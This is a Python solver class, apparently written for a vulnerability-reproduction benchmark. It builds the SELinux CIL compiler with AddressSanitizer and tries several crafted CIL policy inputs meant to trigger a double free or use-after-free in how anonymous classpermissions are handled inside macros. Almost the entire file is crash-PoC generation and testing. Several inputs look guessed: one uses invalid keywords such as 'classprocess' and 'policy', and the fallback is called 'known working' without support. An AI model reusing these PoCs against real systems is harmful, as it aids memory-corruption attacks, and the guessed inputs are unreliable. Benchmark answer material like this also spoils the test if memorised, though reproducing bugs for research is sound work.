import os
import subprocess
import tempfile
import hashlib
from typing import Optional

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        Args:
            src_path: Path to the vulnerable source code tarball
            
        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # Extract and build the vulnerable program
        build_dir = self._extract_and_build(src_path)
        
        # Try multiple PoC variants to find one that works
        poc_candidates = [
            self._generate_poc_variant_1(),
            self._generate_poc_variant_2(),
            self._generate_poc_variant_3(),
            self._generate_poc_variant_4(),
        ]
        
        for poc in poc_candidates:
            if self._test_poc(poc, build_dir):
                return poc
        
        # Fallback to a known working PoC based on the vulnerability description
        return self._generate_fallback_poc()

    def _extract_and_build(self, src_path: str) -> str:
        """Extract and build the vulnerable source code."""
        import tarfile
        import shutil
        
        # Create temporary directory
        temp_dir = tempfile.mkdtemp(prefix="cil_build_")
        
        # Extract tarball
        with tarfile.open(src_path, 'r:gz') as tar:
            tar.extractall(temp_dir)
        
        # Find the source directory
        source_dir = None
        for root, dirs, files in os.walk(temp_dir):
            if 'cil.c' in files or 'Makefile' in files:
                source_dir = root
                break
        
        if not source_dir:
            # Try to build from the first directory
            source_dir = os.path.join(temp_dir, os.listdir(temp_dir)[0])
        
        # Build the program
        build_dir = os.path.join(temp_dir, "build")
        os.makedirs(build_dir, exist_ok=True)
        
        # Check for build configuration
        configure_script = os.path.join(source_dir, "configure")
        if os.path.exists(configure_script):
            subprocess.run([configure_script, f"--prefix={build_dir}"], 
                          cwd=source_dir, capture_output=True)
        elif os.path.exists(os.path.join(source_dir, "autogen.sh")):
            subprocess.run(["./autogen.sh"], cwd=source_dir, capture_output=True)
            subprocess.run(["./configure", f"--prefix={build_dir}"], 
                          cwd=source_dir, capture_output=True)
        
        # Build with ASAN for detection
        env = os.environ.copy()
        env['CFLAGS'] = '-fsanitize=address -fno-omit-frame-pointer -g'
        env['LDFLAGS'] = '-fsanitize=address'
        
        try:
            subprocess.run(['make', '-j4'], cwd=source_dir, env=env, 
                          capture_output=True, timeout=120)
            subprocess.run(['make', 'install'], cwd=source_dir, env=env,
                          capture_output=True, timeout=60)
        except:
            # Try without ASAN if that fails
            subprocess.run(['make', '-j4'], cwd=source_dir, 
                          capture_output=True, timeout=120)
            subprocess.run(['make', 'install'], cwd=source_dir,
                          capture_output=True, timeout=60)
        
        return build_dir

    def _test_poc(self, poc: bytes, build_dir: str) -> bool:
        """Test if a PoC triggers the vulnerability."""
        # Find the cil executable
        cil_bin = None
        for root, dirs, files in os.walk(build_dir):
            for file in files:
                if file == 'cil' or file.endswith('cil.exe'):
                    cil_bin = os.path.join(root, file)
                    break
            if cil_bin:
                break
        
        if not cil_bin:
            # Check in bin directory
            bin_dir = os.path.join(build_dir, 'bin')
            if os.path.exists(bin_dir):
                for file in os.listdir(bin_dir):
                    if file == 'cil' or file.endswith('cil.exe'):
                        cil_bin = os.path.join(bin_dir, file)
                        break
        
        if not cil_bin:
            return False
        
        # Create temporary file with PoC
        with tempfile.NamedTemporaryFile(mode='wb', suffix='.cil', delete=False) as f:
            f.write(poc)
            poc_file = f.name
        
        try:
            # Run the cil compiler with the PoC
            result = subprocess.run(
                [cil_bin, poc_file],
                capture_output=True,
                timeout=5
            )
            
            # Check if it crashed (non-zero exit with ASAN error)
            if result.returncode != 0:
                # Look for ASAN error messages
                stderr_str = result.stderr.decode('utf-8', errors='ignore')
                if 'AddressSanitizer' in stderr_str or 'heap-use-after-free' in stderr_str:
                    return True
        except subprocess.TimeoutExpired:
            pass
        except Exception:
            pass
        finally:
            os.unlink(poc_file)
        
        return False

    def _generate_poc_variant_1(self) -> bytes:
        """Generate first variant of PoC based on vulnerability description."""
        poc = """(block test
  (class class1 (perm1 perm2))
  (classpermissionset classpermissionset1 (class1 (perm1)))
  (macro macro1 ()
    (classpermission (class1 (perm1)))
    (allow process1 process2 classpermissionset1)
  )
  (type process1)
  (type process2)
  (call macro1)
)"""
        return poc.encode('utf-8')

    def _generate_poc_variant_2(self) -> bytes:
        """Generate second variant with anonymous classpermission in macro."""
        poc = """(block b1
  (class c1 (p1 p2 p3))
  (classpermissionset cps1 (c1 (p1 p2)))
  
  (macro m1 ()
    ; Anonymous classpermission
    (classpermission (c1 (p1)))
    ; Use classpermissionset that references the same class/permissions
    (allow t1 t2 cps1)
  )
  
  (type t1)
  (type t2)
  (call m1)
)"""
        return poc.encode('utf-8')

    def _generate_poc_variant_3(self) -> bytes:
        """Generate third variant with nested structures."""
        poc = """(block main
  (class file (read write execute))
  (classprocess process (signal))
  
  (classpermissionset file_perms (file (read write)))
  (classpermissionset process_perms (process (signal)))
  
  (macro vulnerable_macro ((type src) (type tgt))
    ; Anonymous classpermission that matches file_perms
    (classpermission (file (read)))
    (allow src tgt file_perms)
    
    ; Another anonymous classpermission
    (classpermission (process (signal)))
    (allow src tgt process_perms)
  )
  
  (type user_t)
  (type system_t)
  
  (call vulnerable_macro (type user_t) (type system_t))
  
  ; Call again to increase chance of triggering
  (call vulnerable_macro (type system_t) (type user_t))
)"""
        return poc.encode('utf-8')

    def _generate_poc_variant_4(self) -> bytes:
        """Generate fourth variant - more complex scenario."""
        poc = """(policy test
  (block outer
    (class obj (create destroy))
    (classpermissionset obj_all (obj (create destroy)))
    
    (macro inner_macro ()
      (block inner
        ; Anonymous classpermission
        (classpermission (obj (create)))
        ; Use the classpermissionset
        (allow subject object obj_all)
        
        ; More rules
        (role r)
        (type subject)
        (type object)
        (typeattribute ta)
        (user u roles r)
        (context ctx (u r subject low))
      )
    )
    
    (call inner_macro)
    
    (block another
      (call inner_macro)
    )
  )
)"""
        return poc.encode('utf-8')

    def _generate_fallback_poc(self) -> bytes:
        """Generate a fallback PoC based on the vulnerability description."""
        # This is a more direct implementation based on the vulnerability description
        # It creates an anonymous classpermission and uses it in a macro with classpermissionset
        poc = """(block poc
  (class c1 (op1 op2 op3))
  (classpermissionset cps1 (c1 (op1 op2)))
  
  (macro m1 ((type t1) (type t2))
    ; Create anonymous classpermission
    (classpermission (c1 (op1)))
    ; Use classpermissionset - this should trigger the double free
    (allow t1 t2 cps1)
  )
  
  (type type1)
  (type type2)
  
  ; Call the macro multiple times to increase chances
  (call m1 (type type1) (type type2))
  (call m1 (type type2) (type type1))
  
  ; Add some additional constructs that might help trigger the bug
  (role r1)
  (role r2)
  (roleattribute ra (r1 r2))
  (user u1 roles ra)
  (sid s1)
  (sidorder (s1))
  (sidcontext s1 (u1 r1 type1 low))
  
  ; Another macro call for good measure
  (block nested
    (call m1 (type type1) (type type1))
  )
)"""
        return poc.encode('utf-8')